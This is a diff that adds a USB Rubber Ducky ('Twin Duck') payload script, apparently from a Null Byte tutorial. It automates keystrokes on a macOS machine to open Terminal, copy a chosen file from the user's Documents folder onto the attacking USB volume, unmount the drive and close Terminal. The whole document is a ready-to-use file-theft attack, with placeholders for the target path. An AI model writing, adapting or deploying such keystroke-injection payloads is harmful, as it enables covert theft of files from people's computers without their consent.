@@ -1,0 +1,24 @@
+REM OSX FILEGRABBER FOR TWIN DUCK
+REM STAY SAD - SADMIN FOR NULL BYTE 2017
+REM You should replace ~/Desktop/TARGET/secrets.txt with the file path for your target file
+DELAY 2000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING cp -av ~/Users/<username>/Documents/<defined directory> <defined text file.txt> /Volumes/SAD/
+DELAY 200
+ENTER
+DELAY 1000
+STRING diskutil unmount /Volumes/SAD
+DELAY 500
+ENTER
+DELAY 4000
+STRING exit
+DELAY 200
+ENTER
+DELAY 2000
+GUI q
+ENTER
